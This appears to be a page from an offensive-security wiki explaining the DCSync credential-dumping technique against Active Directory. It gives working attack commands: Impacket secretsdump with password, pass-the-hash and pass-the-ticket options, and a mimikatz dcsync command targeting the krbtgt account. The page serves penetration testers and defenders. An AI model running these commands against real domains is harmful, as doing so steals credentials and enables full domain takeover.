---
description: MITRE ATT&CK™ Sub-technique T1003.006
---

# DCSync

## Theory

DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos `krbtgt` keys used legitimately for tickets creation, but also for [tickets forging](../../abusing-kerberos/forged-tickets.md) by attackers. The consequences of this attack are similar to an [NTDS.dit dump and parsing](ntds.dit.md) but the practical aspect differ. **A DCSync is not a simple copy & parse of the NTDS.dit file**, it's a `DsGetNCChanges` operation transported in an RPC request to the DRSUAPI \(Directory Replication Service API\) to replicate data \(including credentials\) from a domain controller.

**This attack requires domain admin privileges** to succeed \(more specifically, it needs the following extended privileges: `DS-Replication-Get-Changes`  and `DS-Replication-Get-Changes-All`\). Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. In some cases, over-privileged accounts can be abused to [grant controlled objects the right to DCSync](../../abusing-aces/granting-genericall.md).

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
On UNIX-like systems, this attack can be carried out with [Impacket](https://github.com/SecureAuthCorp/impacket/)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) which has the ability to run this attack on an elevated context obtained through [plaintext password stuffing](../bruteforcing/stuffing.md), [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md) or [pass-the-ticket](../../abusing-kerberos/pass-the-ticket.md).

```bash
# using a plaintext password
secretsdump -outputfile resultsfile 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'

# with Pass-the-Hash
secretsdump -outputfile resultsfile -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'

# with Pass-the-Ticket
secretsdump -k -outputfile resultsfile 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) \(C\) can be used to operate a DCSync and recover the `krbtgt` keys for a [golden ticket attack](../../abusing-kerberos/forged-tickets.md#golden-ticket). For this attack to work, the following mimikatz command should run in an elevated context \(i.e. through [plaintext password stuffing](../bruteforcing/stuffing.md#runas), [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md) or [pass-the-ticket](../../abusing-kerberos/pass-the-ticket.md)\).

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync" %}

